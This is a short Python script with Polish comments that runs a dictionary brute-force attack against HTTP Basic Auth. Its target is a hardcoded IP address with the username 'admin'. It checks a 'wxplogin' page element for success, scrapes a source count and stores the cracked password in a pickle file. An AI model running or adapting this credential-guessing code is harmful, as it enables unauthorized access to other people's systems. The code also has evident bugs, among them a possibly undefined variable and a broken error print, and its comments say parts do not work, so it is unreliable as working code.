import requests
from bs4 import BeautifulSoup
import sys
import re
import pickle


def pbreak(linkometoda, username):
    try:
        dictionary = 'dictionary.txt'  # tu moze byc cos nie tak
        with open(dictionary, 'r') as f:
            for line in f.readlines():
                password = line.strip('\n')
                sys.stdout.write('\r%s' % str(password))
                try:
                    # cos z urllib2 albo response
                    response = requests.get(
                        linkometoda, auth=requests.auth.HTTPBasicAuth(username, password))
                    page = BeautifulSoup(response.text, "lxml")

                    wxplog = str(page.find_all(
                        attrs={'class': 'wxplogin'})) + "\n"
                    # pomysl jest taki: ze mowi ze jestes: logged as username,
                    # czy cos podobnego
                    condition1 = username in wxplog
                    # ale to nie dziala, moze jakies re, ale nie wiem
                finally:
                    if condition1:  # regular???
                        sys.stdout.write('\r')
                        count = re.findall(r"[\w']+", str(page))
                        try:
                            sources = int(count[count.index('Source') + 1])
                        except:
                            sources = 0

                        print('Hasło: %s' % str(password))
                        return (password, sources)
        pass
    except Exception as e:  # dodac bledy: otwierania pliku, bez hasla moze, error urlliba
        print('cos nie tak') + str(e)


if __name__ == '__main__':
    adres = 'http://59.177.49.12:8080'
    name = 'admin'

    password, sources = pbreak(adres, name)

    members = {}
    members[adres] = str(password)
    output = open('database.pkl', 'wb')
    pickle.dump(members, output)
    output.close()

    members = pickle.load(open('database.pkl', 'rb'))
    print(members)
    print('http://59.177.49.12:8080' in members)
    print('hehe' in members)
